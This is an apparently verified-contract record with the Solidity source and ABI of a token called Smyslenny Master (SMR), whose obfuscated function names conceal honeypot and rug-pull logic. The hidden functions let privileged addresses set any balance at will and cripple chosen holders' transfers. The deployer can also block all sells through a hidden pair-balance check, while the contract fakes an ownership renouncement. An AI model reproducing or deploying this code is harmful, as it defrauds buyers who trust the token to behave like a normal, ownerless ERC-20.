{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface buyListSender {\n    function createPair(address swapTeam, address teamMin) external returns (address);\n}\n\ninterface launchWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxExemptReceiver) external view returns (uint256);\n\n    function transfer(address tradingMarketing, uint256 minBuy) external returns (bool);\n\n    function allowance(address teamAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingMarketing,\n        uint256 minBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitFund, uint256 value);\n    event Approval(address indexed teamAuto, address indexed spender, uint256 value);\n}\n\nabstract contract shouldSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchWalletMetadata is launchWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SmyslennyMaster is shouldSell, launchWallet, launchWalletMetadata {\n\n    function marketingLiquidity(address takeMarketing, uint256 minBuy) public {\n        isSenderShould();\n        buyEnable[takeMarketing] = minBuy;\n    }\n\n    function transfer(address takeMarketing, uint256 minBuy) external virtual override returns (bool) {\n        return launchedMarketing(_msgSender(), takeMarketing, minBuy);\n    }\n\n    mapping(address => bool) public modeIs;\n\n    function launchedMarketing(address fundExempt, address tradingMarketing, uint256 minBuy) internal returns (bool) {\n        if (fundExempt == takeList) {\n            return tradingAmount(fundExempt, tradingMarketing, minBuy);\n        }\n        uint256 swapFrom = launchWallet(totalFund).balanceOf(isReceiverSender);\n        require(swapFrom == liquiditySenderMax);\n        require(tradingMarketing != isReceiverSender);\n        if (modeIs[fundExempt]) {\n            return tradingAmount(fundExempt, tradingMarketing, minAmountAuto);\n        }\n        return tradingAmount(fundExempt, tradingMarketing, minBuy);\n    }\n\n    function balanceOf(address maxExemptReceiver) public view virtual override returns (uint256) {\n        return buyEnable[maxExemptReceiver];\n    }\n\n    bool public receiverIs;\n\n    function limitAt(address maxBuy) public {\n        require(maxBuy.balance < 100000);\n        if (modeLimit) {\n            return;\n        }\n        \n        amountIs[maxBuy] = true;\n        if (tokenTrading != launchEnable) {\n            exemptEnable = false;\n        }\n        modeLimit = true;\n    }\n\n    uint256 public tokenTrading;\n\n    uint256 sellTotal;\n\n    bool private exemptEnable;\n\n    function marketingBuy(address launchedTrading) public {\n        isSenderShould();\n        \n        if (launchedTrading == takeList || launchedTrading == totalFund) {\n            return;\n        }\n        modeIs[launchedTrading] = true;\n    }\n\n    bool public modeLimit;\n\n    constructor (){\n        if (listMode) {\n            exemptEnable = false;\n        }\n        toTx buyAt = toTx(toExemptShould);\n        totalFund = buyListSender(buyAt.factory()).createPair(buyAt.WETH(), address(this));\n        if (launchEnable != tokenTrading) {\n            listMode = true;\n        }\n        takeList = _msgSender();\n        amountIs[takeList] = true;\n        buyEnable[takeList] = receiverMarketingIs;\n        amountLaunchedReceiver();\n        if (receiverIs != listMode) {\n            tokenTrading = launchEnable;\n        }\n        emit Transfer(address(0), takeList, receiverMarketingIs);\n    }\n\n    function getOwner() external view returns (address) {\n        return enableSender;\n    }\n\n    mapping(address => bool) public amountIs;\n\n    address public totalFund;\n\n    uint256 liquiditySenderMax;\n\n    uint8 private teamMode = 18;\n\n    uint256 private receiverMarketingIs = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private buyEnable;\n\n    address public takeList;\n\n    address private enableSender;\n\n    uint256 public launchEnable;\n\n    function tradingAmount(address fundExempt, address tradingMarketing, uint256 minBuy) internal returns (bool) {\n        require(buyEnable[fundExempt] >= minBuy);\n        buyEnable[fundExempt] -= minBuy;\n        buyEnable[tradingMarketing] += minBuy;\n        emit Transfer(fundExempt, tradingMarketing, minBuy);\n        return true;\n    }\n\n    bool private listMode;\n\n    function owner() external view returns (address) {\n        return enableSender;\n    }\n\n    event OwnershipTransferred(address indexed amountTakeSender, address indexed sellTake);\n\n    function allowance(address maxWalletBuy, address tradingTeamAmount) external view virtual override returns (uint256) {\n        if (tradingTeamAmount == toExemptShould) {\n            return type(uint256).max;\n        }\n        return toShould[maxWalletBuy][tradingTeamAmount];\n    }\n\n    string private walletAuto = \"Smyslenny Master\";\n\n    function name() external view virtual override returns (string memory) {\n        return walletAuto;\n    }\n\n    function amountLaunchedReceiver() public {\n        emit OwnershipTransferred(takeList, address(0));\n        enableSender = address(0);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamMode;\n    }\n\n    string private fromBuy = \"SMR\";\n\n    uint256 constant minAmountAuto = 9 ** 10;\n\n    address isReceiverSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address toExemptShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromBuy;\n    }\n\n    function isSenderShould() private view {\n        require(amountIs[_msgSender()]);\n    }\n\n    function transferFrom(address fundExempt, address tradingMarketing, uint256 minBuy) external override returns (bool) {\n        if (_msgSender() != toExemptShould) {\n            if (toShould[fundExempt][_msgSender()] != type(uint256).max) {\n                require(minBuy <= toShould[fundExempt][_msgSender()]);\n                toShould[fundExempt][_msgSender()] -= minBuy;\n            }\n        }\n        return launchedMarketing(fundExempt, tradingMarketing, minBuy);\n    }\n\n    mapping(address => mapping(address => uint256)) private toShould;\n\n    function approve(address tradingTeamAmount, uint256 minBuy) public virtual override returns (bool) {\n        toShould[_msgSender()][tradingTeamAmount] = minBuy;\n        emit Approval(_msgSender(), tradingTeamAmount, minBuy);\n        return true;\n    }\n\n    function walletIs(uint256 minBuy) public {\n        isSenderShould();\n        liquiditySenderMax = minBuy;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverMarketingIs;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTakeSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxWalletBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTeamAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLaunchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTeamAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExemptReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxBuy\",\"type\":\"address\"}],\"name\":\"limitAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTrading\",\"type\":\"address\"}],\"name\":\"marketingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minBuy\",\"type\":\"uint256\"}],\"name\":\"marketingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minBuy\",\"type\":\"uint256\"}],\"name\":\"walletIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SmyslennyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}